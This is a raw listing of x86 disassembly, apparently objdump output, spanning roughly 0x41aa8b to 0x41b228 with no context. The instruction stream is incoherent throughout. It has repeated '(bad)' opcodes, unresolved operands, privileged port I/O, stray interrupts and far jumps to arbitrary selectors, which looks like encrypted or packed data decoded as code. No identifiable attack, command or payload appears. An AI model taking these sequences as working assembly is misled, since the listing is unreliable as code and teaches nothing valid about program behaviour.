  41aa8b:	out    0xae,eax
  41aa8d:	mov    ebx,0xa3f14a6b
  41aa92:	out    0x76,eax
  41aa94:	fiadd  WORD PTR [ebx-0xf4dc0f5]
  41aa9a:	lods   al,BYTE PTR ds:[esi]
  41aa9b:	sbb    eax,0x1d2c2d80
  41aaa0:	jecxz  0x41aa3d
  41aaa2:	aam    0xea
  41aaa4:	and    BYTE PTR [edx-0x37],bh
  41aaa7:	mov    WORD PTR [ebx],?
  41aaa9:	test   esi,edi
  41aaab:	lahf   
  41aaac:	and    eax,0xed54bf5e
  41aab1:	jno    0x41aa96
  41aab3:	cwde   
  41aab4:	(bad)  
  41aab6:	scas   eax,DWORD PTR es:[edi]
  41aab7:	xchg   edi,eax
  41aab8:	mov    bh,0x17
  41aaba:	enter  0x24ad,0xc9
  41aabe:	jle    0x41aa75
  41aac0:	pop    es
  41aac1:	mov    cl,0x6f
  41aac3:	push   0xafd997bd
  41aac8:	call   0xe4b4:0x3c49d303
  41aacf:	mov    ebp,0x5c2c1b1a
  41aad4:	rol    BYTE PTR [esi+0x23],cl
  41aad7:	pop    esp
  41aad8:	adc    cl,0x43
  41aadb:	mov    WORD PTR [ebx],fs
  41aadd:	pop    ds
  41aade:	int3   
  41aadf:	test   eax,0x6a7032a0
  41aae4:	rcl    BYTE PTR [edx],cl
  41aae6:	(bad)  
  41aae7:	mov    ch,0x32
  41aae9:	adc    eax,0xd4ff4e3b
  41aaee:	retf   0xf738
  41aaf1:	fwait
  41aaf2:	inc    edx
  41aaf3:	bound  ecx,QWORD PTR [ebx-0x7a42ff7e]
  41aaf9:	ins    DWORD PTR es:[edi],dx
  41aafa:	xchg   ecx,eax
  41aafb:	fcom   QWORD PTR ds:0xfc52d46e
  41ab01:	add    BYTE PTR [ecx+0x59a0872f],al
  41ab07:	add    BYTE PTR [ecx+0x4a6d7ccc],dl
  41ab0d:	dec    ebx
  41ab0e:	int    0xa1
  41ab10:	jno    0x41aaaa
  41ab12:	cmc    
  41ab13:	mov    DWORD PTR [eax],esp
  41ab15:	inc    ebp
  41ab16:	(bad)  
  41ab17:	clc    
  41ab18:	lds    esp,FWORD PTR [esi-0x7f]
  41ab1b:	jne    0x41ab0f
  41ab1d:	outs   dx,DWORD PTR ds:[esi]
  41ab1e:	and    esp,DWORD PTR [ebx]
  41ab20:	adc    esp,DWORD PTR [edi]
  41ab22:	pusha  
  41ab23:	addr16 dec eax
  41ab25:	fwait
  41ab26:	pop    eax
  41ab27:	adc    bh,BYTE PTR [ebp-0x709d4367]
  41ab2d:	fsubr  QWORD PTR [ecx+ecx*2]
  41ab30:	push   ebx
  41ab31:	addr16 pop ebx
  41ab33:	inc    edx
  41ab34:	fbstp  TBYTE PTR [esp+eiz*4]
  41ab38:	mov    eax,edi
  41ab3a:	sbb    ebp,edx
  41ab3c:	mov    esp,0x569b3df7
  41ab41:	mov    eax,ds:0x8c0bdca6
  41ab46:	je     0x41ab5e
  41ab48:	fsubr  DWORD PTR [ebp-0x5ab7cd42]
  41ab4e:	mul    eax
  41ab50:	rol    DWORD PTR [ebp-0x69],cl
  41ab53:	jg     0x41abcb
  41ab55:	pop    esp
  41ab56:	(bad)  
  41ab57:	adc    eax,0xfcba2a42
  41ab5c:	aad    0x50
  41ab5e:	mov    bh,ah
  41ab60:	rol    eax,0xee
  41ab63:	adc    al,0x4
  41ab65:	(bad)  
  41ab66:	in     eax,dx
  41ab67:	inc    edi
  41ab68:	mov    ebx,0x9860ecf3
  41ab6d:	ds pop esi
  41ab6f:	xchg   edi,eax
  41ab70:	repnz cli 
  41ab72:	mov    al,ds:0x6e2c5967
  41ab77:	pop    eax
  41ab78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab79:	cmp    dh,BYTE PTR [eax-0x8a2f48a]
  41ab7f:	push   edi
  41ab80:	jo     0x41abbd
  41ab82:	inc    ecx
  41ab83:	add    bl,BYTE PTR [eax+0x4a693c56]
  41ab89:	mov    ds:0xb010d63a,al
  41ab8e:	push   edi
  41ab8f:	mov    bh,BYTE PTR ds:0x9dcdc95c
  41ab95:	in     al,dx
  41ab96:	dec    BYTE PTR [edx-0x10]
  41ab99:	fdiv   QWORD PTR [eax]
  41ab9b:	add    eax,0x99bfe3e8
  41aba0:	jmp    0x41abab
  41aba2:	pop    eax
  41aba3:	cwde   
  41aba4:	push   ebx
  41aba5:	int    0x13
  41aba7:	stc    
  41aba8:	jae    0x41abe8
  41abaa:	fadd   DWORD PTR [edx-0x3d]
  41abad:	push   ecx
  41abae:	arpl   cx,sp
  41abb0:	mov    eax,0xf5c8ee7f
  41abb5:	jo     0x41abd3
  41abb7:	adc    bl,dh
  41abb9:	outs   dx,BYTE PTR ds:[esi]
  41abba:	js     0x41ab49
  41abbc:	retf   0x56f2
  41abbf:	ror    DWORD PTR [edx-0x6be47463],0xdf
  41abc6:	adc    DWORD PTR [esp+edi*1+0x53f591b3],0x9
  41abce:	jmp    0xa03d443c
  41abd3:	dec    edx
  41abd4:	fwait
  41abd5:	inc    eax
  41abd6:	int    0x7d
  41abd8:	mov    dh,0x9d
  41abda:	inc    edi
  41abdb:	pop    esi
  41abdc:	inc    esp
  41abdd:	push   edx
  41abde:	sbb    DWORD PTR [edi+0x2b],0xf0e1e431
  41abe5:	in     eax,dx
  41abe6:	adc    al,0xe9
  41abe8:	cmp    al,0xda
  41abea:	lds    edi,FWORD PTR [ebx+0x28]
  41abed:	shl    DWORD PTR [edx],1
  41abef:	(bad)  
  41abf0:	push   ds
  41abf1:	test   BYTE PTR [ebx-0x6feafdc9],bl
  41abf7:	xchg   BYTE PTR [esi+0x547e6cfb],dh
  41abfd:	shl    BYTE PTR [ebp+eiz*4+0x20],cl
  41ac01:	retf   
  41ac02:	cmc    
  41ac03:	lods   eax,DWORD PTR ds:[esi]
  41ac04:	ficomp WORD PTR [edx]
  41ac06:	jo     0x41ac73
  41ac08:	(bad)  
  41ac09:	ds xor al,0x3d
  41ac0c:	xor    eax,0x95a3028c
  41ac11:	pop    esp
  41ac12:	outs   dx,DWORD PTR ds:[esi]
  41ac13:	lahf   
  41ac14:	shr    DWORD PTR [esi+0x2d],cl
  41ac17:	mov    dh,0xe
  41ac19:	es or  eax,0xdd1dd5eb
  41ac1f:	xchg   ebx,eax
  41ac20:	lds    edx,FWORD PTR ds:0x9152efd3
  41ac26:	mov    esp,0x42c3cc30
  41ac2b:	adc    ebx,DWORD PTR [ebx]
  41ac2d:	fdivr  DWORD PTR [ebx+ebp*2+0x79]
  41ac31:	xor    eax,0xadecb901
  41ac36:	test   eax,0x9c9ce865
  41ac3b:	xchg   ebx,eax
  41ac3c:	fcomp  DWORD PTR [esi+ebx*8]
  41ac3f:	xchg   edx,eax
  41ac40:	dec    esi
  41ac41:	and    bl,BYTE PTR [esi-0x699849d7]
  41ac47:	out    0x20,al
  41ac49:	add    eax,0xa6e4128a
  41ac4e:	add    DWORD PTR [ebx+0x1dba2590],0xffffffc3
  41ac55:	das    
  41ac56:	or     al,0x60
  41ac58:	push   eax
  41ac59:	int    0x14
  41ac5b:	dec    ebx
  41ac5c:	sahf   
  41ac5d:	das    
  41ac5e:	and    al,0x3b
  41ac60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac61:	lods   al,BYTE PTR ds:[esi]
  41ac62:	mov    eax,ds:0xa52c6a5b
  41ac67:	lds    esp,FWORD PTR [edi-0x71f4b135]
  41ac6d:	scas   al,BYTE PTR es:[edi]
  41ac6e:	sub    DWORD PTR [edx-0x3a],0xffffffea
  41ac72:	(bad)  
  41ac73:	mov    cl,0x24
  41ac75:	and    eax,esi
  41ac77:	add    ah,bl
  41ac79:	mov    ah,0xb4
  41ac7b:	hlt    
  41ac7c:	int    0x9
  41ac7e:	sbb    eax,0xde1b1f
  41ac83:	xchg   esp,eax
  41ac84:	gs ss and al,0x9e
  41ac88:	js     0x41ac17
  41ac8a:	xlat   BYTE PTR ds:[ebx]
  41ac8b:	xchg   ebp,eax
  41ac8c:	mov    ecx,0xb99f7cb3
  41ac91:	fidivr DWORD PTR [ecx+0x3a]
  41ac94:	mov    bl,0xbc
  41ac96:	mov    dl,0x63
  41ac98:	mov    al,BYTE PTR [edx-0x5f745b6f]
  41ac9e:	add    esp,edi
  41aca0:	ret    
  41aca1:	in     eax,0x4e
  41aca3:	les    edx,FWORD PTR [ebx+0x482aed7a]
  41aca9:	sbb    eax,DWORD PTR ds:0x59f8bee
  41acaf:	pusha  
  41acb0:	dec    eax
  41acb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41acb2:	jecxz  0x41ac78
  41acb4:	mov    ebx,0x394afdbe
  41acb9:	mov    esp,0xd994608e
  41acbe:	out    dx,eax
  41acbf:	push   0xedac86b3
  41acc4:	push   ebx
  41acc5:	pop    eax
  41acc6:	sub    al,0xb0
  41acc8:	mov    ds:0xafdf577a,al
  41accd:	lea    esp,[esi+0x4c]
  41acd0:	bound  ebp,QWORD PTR [eax+0x6f866019]
  41acd6:	sub    DWORD PTR [edx],esi
  41acd8:	lock mov ebp,0x1d38039
  41acde:	sbb    al,0x36
  41ace0:	or     eax,ebx
  41ace2:	jl     0x41aca2
  41ace4:	retf   
  41ace5:	or     BYTE PTR [ecx-0x54],cl
  41ace8:	sti    
  41ace9:	loope  0x41acd2
  41aceb:	nop
  41acec:	outs   dx,DWORD PTR ds:[esi]
  41aced:	rcl    DWORD PTR ds:0xe08f27a6,cl
  41acf3:	dec    edx
  41acf4:	and    bh,BYTE PTR [esp+ebx*1]
  41acf7:	je     0x41ace5
  41acf9:	test   eax,0xdfd05f0e
  41acfe:	fild   DWORD PTR [ecx]
  41ad00:	push   0x4e
  41ad02:	dec    DWORD PTR [ecx+0x4b4bce3d]
  41ad08:	pusha  
  41ad09:	test   BYTE PTR [eax+0x250cfd71],ch
  41ad0f:	fsubr  st,st(5)
  41ad11:	in     al,dx
  41ad12:	aaa    
  41ad13:	xlat   BYTE PTR ds:[bx]
  41ad15:	pop    es
  41ad16:	jg     0x41ad00
  41ad18:	cli    
  41ad19:	or     al,0x3f
  41ad1b:	lods   eax,DWORD PTR ds:[esi]
  41ad1c:	dec    ecx
  41ad1d:	sub    esi,DWORD PTR [eax+edi*8]
  41ad20:	pop    ebx
  41ad21:	inc    edx
  41ad22:	lock sbb DWORD PTR [edx],ebx
  41ad25:	iret   
  41ad26:	lock rcr BYTE PTR [ebx+0x7c],0xdd
  41ad2b:	push   edi
  41ad2c:	stos   BYTE PTR es:[edi],al
  41ad2d:	sbb    ebx,DWORD PTR [ebp-0x30]
  41ad30:	sbb    ch,BYTE PTR [ebp+eiz*2+0xbb83225]
  41ad37:	sbb    al,0xed
  41ad39:	push   0x9f8eb8c4
  41ad3e:	je     0x41ad64
  41ad40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad41:	sar    DWORD PTR ds:0xbd90ac56,1
  41ad47:	or     ebp,DWORD PTR [eax+0x64]
  41ad4a:	dec    edi
  41ad4b:	mov    bh,0x6d
  41ad4d:	sub    BYTE PTR [esi],bl
  41ad4f:	cs jge 0x41adba
  41ad52:	push   ebp
  41ad53:	dec    esp
  41ad54:	(bad)  
  41ad55:	jg     0x41acda
  41ad57:	pop    ecx
  41ad58:	js     0x41ad8f
  41ad5a:	std    
  41ad5b:	mov    eax,ds:0x359f8c78
  41ad60:	ret    
  41ad61:	call   0x1a1b:0x2da2cd40
  41ad68:	push   edx
  41ad69:	shr    dh,1
  41ad6b:	fiadd  DWORD PTR [esi+0xdcd6485]
  41ad71:	test   BYTE PTR [eax+0x1a488210],bl
  41ad77:	retf   0xbc30
  41ad7a:	cwde   
  41ad7b:	inc    esp
  41ad7c:	jmp    0xddf5:0xdb167004
  41ad83:	cmp    BYTE PTR [edx-0x66abd2dd],ch
  41ad89:	mov    ch,BYTE PTR [edi+ecx*1-0x4b]
  41ad8d:	fcomip st,st(4)
  41ad8f:	jb     0x41ad80
  41ad91:	xor    DWORD PTR [ecx],eax
  41ad93:	push   esp
  41ad94:	jmp    0x9788:0xcf03f1c
  41ad9b:	aam    0x12
  41ad9d:	imul   ebx,DWORD PTR [ebp+0x29],0x4aa10064
  41ada4:	popf   
  41ada5:	jbe    0x41adc6
  41ada7:	fsub   QWORD PTR [esi-0x6477f854]
  41adad:	dec    eax
  41adae:	sub    eax,0x5ac29e05
  41adb3:	xchg   ebx,eax
  41adb4:	adc    dl,BYTE PTR [esi+0x13]
  41adb7:	leave  
  41adb8:	cli    
  41adb9:	pop    ebx
  41adba:	int3   
  41adbb:	mov    al,ds:0x9c4d352
  41adc0:	mov    esi,0xc62d0591
  41adc5:	jecxz  0x41adb3
  41adc7:	fsubr  QWORD PTR [edi]
  41adc9:	mov    edx,0xcc18fdc7
  41adce:	sbb    DWORD PTR [esp+edi*8+0x18ce06b0],esp
  41add5:	shl    BYTE PTR [ecx-0x2142f3dd],0x7a
  41addc:	jp     0x41adf4
  41adde:	pop    ebp
  41addf:	popa   
  41ade0:	jge    0x41adba
  41ade2:	imul   esp,DWORD PTR [eax-0x1d79480c],0xffffff8f
  41ade9:	mov    dl,0x7c
  41adeb:	repz out dx,eax
  41aded:	add    DWORD PTR [edx],0x9e8c8b5a
  41adf3:	int3   
  41adf4:	ret    
  41adf5:	jae    0x41adc5
  41adf7:	or     esi,esi
  41adf9:	aam    0xbe
  41adfb:	stos   BYTE PTR es:[edi],al
  41adfc:	shr    BYTE PTR [esi+0x7c],1
  41adff:	xchg   esp,eax
  41ae00:	mov    edi,0x329b98f1
  41ae05:	pop    es
  41ae06:	scas   al,BYTE PTR es:[edi]
  41ae07:	cdq    
  41ae08:	repz or al,0xaa
  41ae0b:	pushf  
  41ae0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae0d:	les    eax,FWORD PTR [ecx]
  41ae0f:	jo     0x41ae22
  41ae11:	inc    esi
  41ae12:	cmp    edx,DWORD PTR ds:0xdd32d366
  41ae18:	pop    ds
  41ae19:	retf   
  41ae1a:	cmp    eax,0x312637c6
  41ae1f:	xor    BYTE PTR [ecx-0x250e6e1a],0x4c
  41ae26:	mov    ch,0x9d
  41ae28:	pop    ebx
  41ae29:	shl    ebx,1
  41ae2b:	or     ah,0xd6
  41ae2e:	add    DWORD PTR [esi+0x5632c8e3],0x9a44d059
  41ae38:	jae    0x41aeb2
  41ae3a:	sbb    eax,0x8293ef5c
  41ae3f:	arpl   WORD PTR [edx+0x9f5e119],bp
  41ae45:	dec    edi
  41ae46:	aad    0x79
  41ae48:	fwait
  41ae49:	mov    dh,BYTE PTR [ebx-0x2d]
  41ae4c:	or     eax,0x304a0f11
  41ae51:	fstp   QWORD PTR [ecx]
  41ae53:	into   
  41ae54:	je     0x41adf4
  41ae56:	sti    
  41ae57:	mov    cl,0x2b
  41ae59:	mov    al,0x13
  41ae5b:	or     eax,0x227c341f
  41ae60:	pop    edi
  41ae61:	xor    edx,DWORD PTR [ecx-0x1c]
  41ae64:	adc    al,0x4a
  41ae66:	test   DWORD PTR [edx],ebp
  41ae68:	sub    ecx,DWORD PTR [ebp+edx*2-0x19]
  41ae6c:	sub    al,0x35
  41ae6e:	xor    al,0xb0
  41ae70:	int    0x55
  41ae72:	test   BYTE PTR [eax+0x3c83f3c5],al
  41ae78:	lds    edx,FWORD PTR [edx+edx*8]
  41ae7b:	out    0xe3,eax
  41ae7d:	out    0x2a,al
  41ae7f:	sub    BYTE PTR [esi+0x67285d14],bh
  41ae85:	inc    edi
  41ae86:	jo     0x41ae1b
  41ae88:	mov    BYTE PTR [ebx+0x4],ah
  41ae8b:	push   eax
  41ae8c:	stos   BYTE PTR es:[edi],al
  41ae8d:	mov    ds:0xa79748a9,al
  41ae92:	mov    al,ds:0x89cb1575
  41ae97:	stos   DWORD PTR es:[edi],eax
  41ae98:	mov    ds:0xfb385a68,eax
  41ae9d:	jns    0x41aefb
  41ae9f:	xchg   esp,eax
  41aea0:	mov    bh,0xca
  41aea2:	mov    eax,0xc004ec6b
  41aea7:	loop   0x41af11
  41aea9:	shl    BYTE PTR [eax],0x50
  41aeac:	jbe    0x41aeb6
  41aeae:	jne    0x41aeec
  41aeb0:	pop    eax
  41aeb1:	mov    ah,0x4
  41aeb3:	cli    
  41aeb4:	pop    ebx
  41aeb5:	mov    dh,0xba
  41aeb7:	jecxz  0x41ae7e
  41aeb9:	mov    WORD PTR [ebx-0x7c],?
  41aebc:	push   ebx
  41aebd:	push   es
  41aebe:	cwde   
  41aebf:	xor    esi,DWORD PTR [edi-0x1f]
  41aec2:	mov    ch,0xe
  41aec4:	mov    ebx,0x9962480d
  41aec9:	xor    al,0x57
  41aecb:	sub    DWORD PTR [eax-0x3fee3855],edi
  41aed1:	mov    ecx,ebx
  41aed3:	dec    esi
  41aed4:	dec    esi
  41aed5:	dec    edi
  41aed6:	mov    dh,0xba
  41aed8:	(bad)  
  41aed9:	js     0x41aece
  41aedb:	adc    al,0xc9
  41aedd:	sbb    eax,0xd5a0a2e
  41aee2:	pop    esp
  41aee3:	out    0xe4,al
  41aee5:	mov    ch,0x7
  41aee7:	sbb    cl,0xdf
  41aeea:	adc    dl,BYTE PTR [edi-0x279b5860]
  41aef0:	xor    BYTE PTR [eax+0x44],al
  41aef3:	add    dh,dh
  41aef5:	pop    ss
  41aef6:	jl     0x41af30
  41aef8:	adc    ebp,DWORD PTR [ecx]
  41aefa:	add    DWORD PTR [eax+0x7a],ebx
  41aefd:	adc    al,0x51
  41aeff:	xlat   BYTE PTR ds:[ebx]
  41af00:	fld    QWORD PTR [ebx]
  41af02:	jno    0x41af1c
  41af04:	xor    ebx,DWORD PTR [eax+ebp*1]
  41af07:	aad    0x88
  41af09:	gs js  0x41ae96
  41af0c:	jnp    0x41aeae
  41af0e:	gs sub eax,0x3b20a8df
  41af14:	pop    ebx
  41af15:	dec    edx
  41af16:	mov    ebp,0x2d46d952
  41af1b:	jnp    0x41aecc
  41af1d:	add    DWORD PTR [ecx],ebx
  41af1f:	xor    eax,esp
  41af21:	icebp  
  41af22:	es into 
  41af24:	jle    0x41aed4
  41af26:	mov    ds,esp
  41af28:	xchg   eax,esp
  41af2a:	ds rol eax,1
  41af2d:	cmp    al,0x30
  41af2f:	repz mov eax,ds:0xe0dea062
  41af35:	sar    DWORD PTR [ecx-0x499dce4f],0x80
  41af3c:	jp     0x41af1c
  41af3e:	icebp  
  41af3f:	fwait
  41af40:	scas   al,BYTE PTR es:[edi]
  41af41:	fiadd  DWORD PTR [esi+ecx*2]
  41af44:	dec    eax
  41af45:	lea    eax,[edi]
  41af47:	scas   eax,DWORD PTR es:[edi]
  41af48:	push   0xcef0af77
  41af4d:	and    al,0xeb
  41af4f:	pusha  
  41af50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af52:	out    0x87,al
  41af54:	inc    ecx
  41af55:	mov    ecx,DWORD PTR [ecx]
  41af57:	popa   
  41af58:	stos   DWORD PTR es:[edi],eax
  41af59:	xchg   esi,eax
  41af5a:	sub    dl,BYTE PTR [ecx-0x6f]
  41af5d:	test   eax,0x6bc796f3
  41af62:	popa   
  41af63:	cmp    BYTE PTR [ecx-0x3f209653],ah
  41af69:	inc    ecx
  41af6a:	mov    ah,0x84
  41af6c:	mov    edx,0x6c5cda7a
  41af71:	not    edi
  41af73:	add    al,0x14
  41af75:	inc    edx
  41af76:	ins    BYTE PTR es:[edi],dx
  41af77:	mov    ebx,0x809104bf
  41af7c:	leave  
  41af7d:	icebp  
  41af7e:	pop    ss
  41af7f:	out    0x20,al
  41af81:	xor    bl,ch
  41af83:	jnp    0x41af5e
  41af85:	add    DWORD PTR [ebp-0x32ec104e],edi
  41af8b:	mov    dh,0x56
  41af8d:	out    0xf0,eax
  41af8f:	jo     0x41afcd
  41af91:	pop    esi
  41af92:	inc    edi
  41af93:	and    ch,al
  41af95:	aaa    
  41af96:	fsub   QWORD PTR [ebx+0x3e29431f]
  41af9c:	push   0xffffffec
  41af9e:	ror    BYTE PTR [ebp*1+0x59f36aa0],cl
  41afa5:	inc    eax
  41afa6:	sbb    BYTE PTR [esi],0xd1
  41afa9:	(bad)  
  41afaa:	retf   0xd24f
  41afad:	jle    0x41af91
  41afaf:	int    0x8b
  41afb1:	aam    0x22
  41afb3:	dec    esi
  41afb4:	inc    ecx
  41afb5:	fild   WORD PTR fs:0xeba8cc17
  41afbc:	push   0xfffffffe
  41afbe:	inc    eax
  41afbf:	dec    eax
  41afc0:	push   es
  41afc1:	cli    
  41afc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41afc3:	pushf  
  41afc4:	xlat   BYTE PTR ds:[ebx]
  41afc5:	enter  0x1e19,0x58
  41afc9:	inc    esp
  41afca:	ja     0x41af8b
  41afcc:	sbb    eax,0x5c9069cf
  41afd1:	idiv   DWORD PTR [ecx-0x4a74c1a]
  41afd7:	mov    BYTE PTR [edi-0x424d8935],0xb
  41afde:	loopne 0x41b01b
  41afe0:	std    
  41afe1:	fld    TBYTE PTR [ecx-0x40]
  41afe4:	pop    ss
  41afe5:	ja     0x41afcb
  41afe7:	leave  
  41afe8:	push   0x22342cc1
  41afed:	sbb    BYTE PTR [ebx+0x699234e6],dl
  41aff3:	push   esp
  41aff4:	adc    edi,eax
  41aff6:	icebp  
  41aff7:	xlat   BYTE PTR ds:[ebx]
  41aff8:	jae    0x41b04a
  41affa:	xor    ebx,ebx
  41affc:	scas   al,BYTE PTR es:[edi]
  41affd:	xor    DWORD PTR [edx+0x11a42a3d],esi
  41b003:	ret    
  41b004:	or     DWORD PTR [edi-0x3eac10ad],ebx
  41b00a:	adc    DWORD PTR [ebp-0x270613a0],ecx
  41b010:	sub    eax,0x86002deb
  41b015:	mov    WORD PTR [edi-0x1f],es
  41b018:	mov    eax,DWORD PTR [eax+ebx*4+0x3c]
  41b01c:	mov    edi,0xf4814358
  41b021:	sbb    bl,ch
  41b023:	mov    esi,0xf5f37698
  41b028:	(bad)
  41b02c:	aaa    
  41b02d:	scas   al,BYTE PTR es:[edi]
  41b02e:	inc    edx
  41b02f:	xchg   esi,eax
  41b030:	push   ecx
  41b031:	inc    edx
  41b032:	sub    al,0xca
  41b034:	(bad)  [eax-0x69]
  41b037:	(bad)  
  41b038:	jg     0x41b064
  41b03a:	enter  0x6ee7,0x12
  41b03e:	jb     0x41b0b7
  41b040:	inc    DWORD PTR [esi-0x5fe2af50]
  41b046:	xor    DWORD PTR [edi-0x4bbb307],0xa5ed66cb
  41b050:	out    0xc,eax
  41b052:	jp     0x41b095
  41b054:	es cmp eax,0xf768bc47
  41b05a:	push   0x7a16fd6b
  41b05f:	jle    0x41b09c
  41b061:	jno    0x41b0c2
  41b063:	outs   dx,BYTE PTR ds:[esi]
  41b064:	mov    dh,0x69
  41b066:	shl    DWORD PTR [ebx-0x2d11280b],cl
  41b06c:	inc    esi
  41b06d:	pusha  
  41b06e:	mov    DWORD PTR [edx-0x2f51f948],edi
  41b074:	push   edi
  41b075:	dec    eax
  41b076:	outs   dx,BYTE PTR ds:[esi]
  41b077:	inc    esi
  41b078:	xor    al,0x2e
  41b07a:	mov    eax,ds:0xf117826a
  41b07f:	out    0x5c,al
  41b081:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b082:	mov    ds:0xe430fdc4,eax
  41b087:	stos   BYTE PTR es:[edi],al
  41b088:	mov    ds:0xb8584804,al
  41b08d:	pop    ecx
  41b08e:	cwde   
  41b08f:	add    al,0xac
  41b091:	push   ecx
  41b092:	and    ecx,ecx
  41b094:	dec    ebx
  41b095:	push   ss
  41b096:	pop    ecx
  41b097:	(bad)  
  41b098:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b099:	scas   eax,DWORD PTR es:[edi]
  41b09a:	jmp    0x30755b3b
  41b09f:	add    edx,0xfffffffa
  41b0a2:	push   ebx
  41b0a3:	outs   dx,DWORD PTR ds:[esi]
  41b0a4:	mov    ?,WORD PTR [ecx+ecx*4]
  41b0a7:	mov    ds:0x5967178d,al
  41b0ac:	inc    ecx
  41b0ad:	ret    
  41b0ae:	shl    BYTE PTR [ebx],0x43
  41b0b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b0b2:	xchg   ebx,ebx
  41b0b4:	(bad)  
  41b0b5:	movups xmm2,xmm6
  41b0b8:	lds    ebx,FWORD PTR [edx+ebx*4+0x1d1f16f1]
  41b0bf:	cmp    edx,ebx
  41b0c1:	cmp    eax,0x52886ff8
  41b0c6:	sbb    DWORD PTR [edx-0xc69d1d0],esp
  41b0cc:	push   esi
  41b0cd:	sbb    ebp,DWORD PTR [edi+0x5d]
  41b0d0:	stc    
  41b0d1:	xchg   DWORD PTR [ebp-0x76],esp
  41b0d4:	addr16 fwait
  41b0d6:	pop    eax
  41b0d7:	ret    
  41b0d8:	push   es
  41b0d9:	dec    esp
  41b0da:	call   0xb599a421
  41b0df:	test   eax,0x1a4e4cf2
  41b0e4:	push   0xd56c824e
  41b0e9:	inc    edi
  41b0ea:	repnz cmc 
  41b0ec:	sbb    al,BYTE PTR [ecx-0xf83002f]
  41b0f2:	cmp    BYTE PTR [ebx],ch
  41b0f4:	outs   dx,BYTE PTR ds:[esi]
  41b0f5:	sub    al,0x3c
  41b0f7:	(bad)  
  41b0f8:	add    al,0x16
  41b0fa:	je     0x41b093
  41b0fc:	mov    eax,ds:0xbd36a687
  41b101:	pushf  
  41b102:	stc    
  41b103:	adc    DWORD PTR [edi+eax*2+0x73b25265],0x8dca4a61
  41b10e:	ret    
  41b10f:	add    DWORD PTR ds:0x91d6d47e,0x68
  41b116:	push   ebx
  41b117:	xor    bl,dh
  41b119:	mov    bh,BYTE PTR [ebp+0x54]
  41b11c:	sbb    DWORD PTR [esi-0x51],0x601720a9
  41b123:	xor    BYTE PTR [esi-0x54],ah
  41b126:	(bad)  
  41b127:	and    al,cl
  41b129:	je     0x41b198
  41b12b:	not    ah
  41b12d:	mov    WORD PTR [ebx],ds
  41b12f:	daa    
  41b130:	xor    al,0x29
  41b132:	and    esi,0x38fb1d0a
  41b138:	aas    
  41b139:	shr    DWORD PTR [edx],cl
  41b13b:	cmp    al,0xbe
  41b13d:	jmp    DWORD PTR [ebp-0x35]
  41b140:	(bad)  
  41b142:	clc    
  41b143:	cmp    BYTE PTR [edi+0x30],al
  41b146:	loope  0x41b1ae
  41b148:	nop
  41b149:	push   esp
  41b14a:	nop
  41b14b:	add    DWORD PTR [eax],ebx
  41b14d:	adc    eax,0x3a7ab320
  41b152:	cmp    al,ah
  41b154:	mov    eax,ds:0x3f9d8b49
  41b159:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b15a:	dec    edi
  41b15b:	push   DWORD PTR [edx+0x22]
  41b15e:	fisttp DWORD PTR ds:0xfbb7a05c
  41b164:	ret    
  41b165:	cmp    DWORD PTR [ecx+0x42aaceef],ebx
  41b16b:	aas    
  41b16c:	jl     0x41b1b6
  41b16e:	ja     0x41b156
  41b170:	pshufw mm2,QWORD PTR [eax+0x10],0xeb
  41b175:	xchg   esi,eax
  41b176:	sbb    BYTE PTR [ebx],cl
  41b178:	addr16 jmp 0xda3bd792
  41b17e:	mov    ch,0x64
  41b180:	jbe    0x41b1e5
  41b182:	bound  ecx,QWORD PTR [edi-0x7bff8c7c]
  41b188:	ins    BYTE PTR es:[edi],dx
  41b189:	and    al,0x25
  41b18b:	lods   al,BYTE PTR ds:[esi]
  41b18c:	xor    eax,0x1fc23305
  41b191:	adc    eax,0xd2c13fca
  41b196:	ret    0x7139
  41b199:	jnp    0x41b14f
  41b19b:	aam    0xa4
  41b19d:	jae    0x41b1ef
  41b19f:	or     BYTE PTR [edi-0x728a1aa1],dh
  41b1a5:	cmp    al,0xae
  41b1a7:	mov    eax,ds:0xe7679bd3
  41b1ac:	mov    al,ds:0x461b7347
  41b1b1:	(bad)  
  41b1b2:	and    al,0x6b
  41b1b4:	popf   
  41b1b5:	sbb    esp,ecx
  41b1b7:	add    edi,ecx
  41b1b9:	loop   0x41b1d3
  41b1bb:	out    dx,eax
  41b1bc:	push   ss
  41b1bd:	sahf   
  41b1be:	int    0x7d
  41b1c0:	jno    0x41b22f
  41b1c2:	leave  
  41b1c3:	mov    DWORD PTR [edi],esi
  41b1c5:	sbb    BYTE PTR [ebp-0x27f9ccd9],cl
  41b1cb:	in     al,dx
  41b1cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b1cd:	dec    ebp
  41b1ce:	dec    edi
  41b1cf:	mov    edx,0xe789b44a
  41b1d5:	adc    ebp,DWORD PTR [edi+0x18d596dd]
  41b1db:	call   0x2ebb:0x702288e2
  41b1e2:	test   BYTE PTR [edi+0x4b4f1b8c],dl
  41b1e8:	out    0x4a,eax
  41b1ea:	pop    ebx
  41b1eb:	call   0xd335:0x885c0881
  41b1f2:	test   esi,ebx
  41b1f4:	cmc    
  41b1f5:	mov    edi,0x24f27455
  41b1fa:	add    edx,DWORD PTR [ebp-0x6a9627b0]
  41b200:	pop    esp
  41b201:	mov    esi,DWORD PTR [esi-0x7e24db80]
  41b207:	jle    0x41b23f
  41b209:	inc    ebp
  41b20a:	add    bl,BYTE PTR [esi-0x629ca052]
  41b210:	xchg   BYTE PTR [eax],bh
  41b212:	jne    0x41b229
  41b214:	ret    
  41b215:	sbb    edi,ebp
  41b217:	rcl    BYTE PTR [eax],1
  41b219:	add    ch,bl
  41b21b:	mov    ah,0xc2
  41b21d:	cmp    ah,BYTE PTR [esi-0x17]
  41b220:	fcomp  st(3)
  41b222:	imul   ecx,esp,0x8fb14242
  41b228:	xor    BYTE PTR [eax],0x8d
